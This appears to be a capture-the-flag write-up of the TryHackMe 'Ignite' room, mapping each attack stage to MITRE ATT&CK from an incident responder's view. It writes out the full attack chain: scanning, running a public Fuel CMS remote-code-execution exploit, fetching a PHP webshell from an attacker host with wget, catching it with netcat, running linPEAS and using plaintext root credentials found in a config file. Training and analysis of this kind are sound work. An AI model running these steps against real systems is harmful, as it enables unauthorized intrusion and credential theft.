---
title: "TryHackMe - Ignite"
categories:
  - Blog
tags:
  - TryHackMe
  - CTF
  - MITRE ATT&CK
toc: true
toc_sticky: true
---

This is a write-up for the [Ignite room on TryHackMe](https://tryhackme.com/room/ignite). The format of this write-up will be from the perspective of an incident responder. I will use the MITRE ATT&CK framework to map the TTPs used during the attack.

# Overview
<a href="/projectpage/assets/images/ignite-nav-layer.png"><img src="/projectpage/assets/images/ignite-nav-layer.png"></a>

# Reconnaissance
Active scanning was used extensively during the reconnaissance phase. Specifically the following sub-techniques were employed:

1. Scanning IP Blocks[(T1595.001)](https://attack.mitre.org/techniques/T1595/001/)
2. Wordlist Scanning[(T1595.003)](https://attack.mitre.org/techniques/T1595/003/)

Additionally, the attacker searched the victim-owned website[(T1594)](https://attack.mitre.org/techniques/T1594/) to gather information which would prove useful for gaining initial access.

## Active Scanning: Scanning IP Blocks
The attacker performed a scan of the target IP using Nmap:

`$ nmap -sV <TARGET IP> -p-`

Results of this scan revealed:

|PORT|STATE|SERVICE|VERSION|
|---|---|---|---|
|80/tcp|open|http|Apache httpd 2.4.18 ((Ubuntu))

## Active Scanning: Wordlist Scanning
Following the discovery of the target's http service, the attacker used Feroxbuster and a wordlist, to enumerate the target's directories or files:

 `$ feroxbuster -u http://<TARGET IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt`

 Results of this scan revealed:

 `http://<TARGET IP>/fuel`

## Search Victim-Owned Website
This lead the attacker to access the target IP address through a web browser. A simple walk through of the target via browser would reveal the default landing page for "Fuel CMS," which contains the version number in use, 1.4. Navigating to `http://<TARGET IP>/fuel` would reveal a login form for the website.

# Resource Development
The attacker's technique at this phase was to obtain capabilites, leveraging the information gathered in the reconnaissance phase. Specifically the sub-technique used here was Obtain Capabilities: Exploits[(T1588.005)](https://attack.mitre.org/techniques/T1588/005/).

## Obtain Capabilities: Exploits
Using an opensource tool such as Searchsploit:

`$ searchsploit fuel cms`

would reveal the following exploit:

[Fuel CMS 1.4.1 - Remote Code Execution](https://www.exploit-db.com/exploits/50477)

This is a python script which exploits a vulnerability in Fuel CMS version 1.4.1.

The second exploit obtained was a php reverse shell. These are easily available from sources such as [Reverse Shell Generator](https://www.revshells.com/).

# Initial Access
The technique used for initial access was to exploit the public-facing application[(T1190)](https://attack.mitre.org/techniques/T1190/).

Additionally, it should be highlighted that the sub-technique of a valid local account was utilized:
- Valid Accounts: Local Accounts[(T1078.003)](https://attack.mitre.org/techniques/T1078/003/)

## Exploit Public-Facing Application
By running the python script found earlier, the attacker would gain the ability to execute arbitrary code on the web server:

`$ python3 /usr/share/exploitdb/exploits/php/webapps/50477.py -u http://<TARGET IP>`

This resulted in the attacker gaining access to a simple command line on the web server, with the "www-data" account.

# Persistence
Following the initial access the attacker established persistence, by uploading the php webshell to the target. This highlights the sub-technique:

- Server Software Component: Webshell[(T1505.003)](https://attack.mitre.org/techniques/T1505/003/)

## Server Software Component: Webshell
In a separate terminal on their local machine, the attacker started a python http server over port 8888:

`$ python3 -m http.server 8888`

Then, the attacker executed the following on the target:

`$ wget http://<ATTACKER IP>:8888/shell.php`

In order to execute the webshell, the attacker used NetCat to listen on the port defined in `shell.php`, 9001:

`$ nc -lvnp 9001`

Then executed the shell on the target by accessing `http://<TARGET IP>/shell.php` in their browser. The attacker now has a method for persistent access to the "www-data" account.

# Credential Access
The attacker used another open source tool to explore the possibilities for privilege escalation, linPEAS. The sub-technique which would prove fruitful would be:
- Unsecured Credentials: Credentials In Files[(T1552.001)](https://attack.mitre.org/techniques/T1552/001/)

## Unsecured Credentials: Credentials In Files
First, the attacker ran the following to upgrade their shell:

`python -c 'import pty; pty.spawn("/bin/bash")'`

The attacker then executed the following commands on the target:

`$ cd /tmp`
`$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64`

After the script was downloaded, the attacker made it executable, and then executed it:

`$ chmod +x linpeas_linux_amd64`
`$ ./linpeas_linux_amd64`

LinPEAS found `/var/www/html/fuel/application/config/database.php` to contain passwords.

The attacker used `cat` to view the contents of this file and found valid credentials for the "root" user in plaintext.

# Privilege Escalation
Now that the attacker has credentials for the "root" user they were able to escalate their privileges

Once again, this highlights the sub-technique:
- Valid Accounts: Local Accounts[(T1078.003)](https://attack.mitre.org/techniques/T1078/003/)

The attacker executed the following on the target:

`$ su`

After entering the password the attacker successfuly obtained a shell as the "root" user.

# Collection
Following the full comprimise of the system, the attacker pivoted to collection.
The technique used in this phase was data from local system[(T1005)](https://attack.mitre.org/techniques/T1005/).

## Data from Local System
The attacker made use of basic command line tools, like `cd`, `ls`, and `cat` to examine the files on the system. Eventually the attacker found the files `flag.txt` and `root.text`.
